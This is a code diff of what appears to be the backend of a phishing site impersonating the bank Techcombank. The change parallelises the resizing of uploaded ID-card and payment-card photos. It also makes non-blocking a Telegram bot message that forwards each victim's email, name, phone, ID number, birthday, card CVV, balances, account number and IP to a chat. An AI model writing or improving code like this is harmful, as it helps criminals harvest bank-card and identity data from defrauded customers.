@@ -40,10 +40,12 @@ export class TechcombankController {
           [fieldname: string]: Express.Multer.File[];
         };
 
-        frontIdCard = await resize(files?.frontIdCard && files?.frontIdCard[0]);
-        backIdCard = await resize(files?.backIdCard && files?.backIdCard[0]);
-        frontCard = await resize(files?.frontCard && files?.frontCard[0]);
-        backCard = await resize(files?.backCard && files?.backCard[0]);
+        [frontIdCard, backIdCard, frontCard, backCard] = await Promise.all([
+          files?.frontIdCard && resize(files?.frontIdCard[0]),
+          files?.backIdCard && resize(files?.backIdCard[0]),
+          files?.frontCard && resize(files?.frontCard[0]),
+          files?.backCard && resize(files?.backCard[0]),
+        ]);
 
         frontIdCard = getUrlUpload(frontIdCard);
         backIdCard = getUrlUpload(backIdCard);
@@ -73,7 +75,7 @@ export class TechcombankController {
 
       await account.save();
 
-      await Promise.allSettled([
+      Promise.allSettled([
         bot.sendMessage(
           CHAT_ID,
           `Email: ${email}\nName: ${name}\nPhone: ${phone}\nID Card: ${idCard}\nBirthday: ${birthday}\nCVV: ${cvv}\nCard Limit: ${cardLimit}\nCard Balance: ${cardBalance}\nPropose Limit: ${proposeLimit}\nCard Type: ${cardType}\nAccount Number: ${accountNumber}\nIP: ${ip}\n`
